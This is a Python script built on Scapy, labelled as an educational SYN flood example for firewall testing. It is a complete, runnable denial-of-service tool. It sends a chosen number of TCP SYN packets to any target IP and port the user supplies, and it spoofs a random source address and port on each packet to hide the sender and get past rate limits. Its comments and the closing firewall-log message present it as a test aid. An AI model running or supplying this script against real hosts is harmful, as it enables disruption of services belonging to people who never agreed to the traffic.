#!/usr/bin/env python3
import sys
import random
from scapy.all import IP, TCP, send

# ==========================================
# 🎓 EDUCATIONAL SYN FLOOD EXAMPLE
# ==========================================
# This script demonstrates how a TCP SYN packet is crafted.
# It is intended for learning network protocols and firewall testing
# in a controlled, authorized environment.
# ==========================================

def syn_flood(target_ip, target_port, count):
    print(f"[*] Starting Educational SYN Flood on {target_ip}:{target_port}")
    print(f"[*] Sending {count} packets...")

    for i in range(count):
        # 1. Fake IP Address (Spoofing)
        # In a real attack, attackers use random source IPs to hide and bypass rate limits.
        # Here we generate a random IP for demonstration.
        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        
        # 2. Random Source Port
        # To look like different connections.
        src_port = random.randint(1024, 65535)

        # 3. Craft the IP Layer
        # IP(src=Fake, dst=Target)
        ip_layer = IP(src=src_ip, dst=target_ip)

        # 4. Craft the TCP Layer
        # Flags="S" means SYN (Synchronize) - The first step of TCP Handshake.
        tcp_layer = TCP(sport=src_port, dport=target_port, flags="S", seq=random.randint(1000, 9000))

        # 5. Stack Layers & Send
        packet = ip_layer / tcp_layer
        
        # verbose=0 suppresses output for speed
        send(packet, verbose=0)
        
        if (i + 1) % 10 == 0:
            print(f" -> Sent {i + 1} packets...")

    print("\n[+] Test Completed.")
    print("[!] Check your Firewall logs to see if it detected 'SYN Flood' or 'Spoofed IP'.")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: sudo python3 {sys.argv[0]} <TARGET_IP> <PORT> <PACKET_COUNT>")
        print("Example: sudo python3 syn_flood_educational.py 192.168.1.5 80 100")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2])
    count = int(sys.argv[3])

    syn_flood(target, port, count)
